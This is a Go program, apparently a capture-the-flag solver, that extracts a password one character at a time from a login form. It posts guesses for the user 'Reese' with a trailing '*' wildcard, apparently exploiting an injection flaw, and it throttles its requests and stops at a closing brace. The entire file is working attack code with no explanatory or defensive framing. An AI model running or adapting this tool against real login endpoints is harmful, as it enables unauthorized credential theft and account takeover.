package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"time"
)

//lookup list generator
func genLookup(n1, n2 int) []string {
	var lookup []string
	for i := n1; i <= n2; i++ {
		lookup = append(lookup, string(i))
	}
	return lookup
}

var end byte = '}'

//request maker
func makeReq(URL, tmp string, pl chan string, rl *bool) {
	uname := "Reese"
	pass := tmp + "*"
	res, err := http.PostForm(URL, url.Values{
		"username": {uname},
		"password": {pass},
	})
	if err != nil {
		fmt.Println("ERR:", err)
		os.Exit(0)
	}
	defer res.Body.Close()
	if len(tmp) > 1 && tmp[len(tmp)-2] == end {
		*rl = true
	}
	if res.StatusCode == 200 && res.Request.URL.String() == URL {
		*rl = false
		pl <- tmp
	}
}

func fuzz(URL string, payload *string, lookup []string, pl chan string, bl chan time.Time) {
	lookupLen := len(lookup) - 1
	var reloop bool
	for i := 0; i < lookupLen; i++ {
		var tmp string
		select {
		case msg := <-pl:
			*payload = msg
			tmp = *payload + lookup[i]
		default:
			tmp = *payload + lookup[i]
		}
		<-bl
		go makeReq(URL, tmp, pl, &reloop)
		if i == lookupLen-1 {
			i = 0
		}
		if reloop {
			break
		}
		fmt.Println(tmp) //output of password

	}
}

func main() {
	args := os.Args[1:]
	if len(args) == 0 {
		fmt.Println("Invalid Input")
		os.Exit(0)
	}
	URL := args[0]
	var payload string = ""
	pl := make(chan string, 1)
	burstyLimiter := make(chan time.Time, 64)
	go func() {
		for t := range time.Tick(17 * time.Millisecond) {
			burstyLimiter <- t
		}
	}()
	lookup := genLookup(47, 126) //generate lookup list using ascii values
	fmt.Println("Charset: ", lookup)
	fmt.Printf("starting...\n")
	fuzz(URL, &payload, lookup, pl, burstyLimiter)
	fmt.Println("\nkey:\n\n", payload)
}
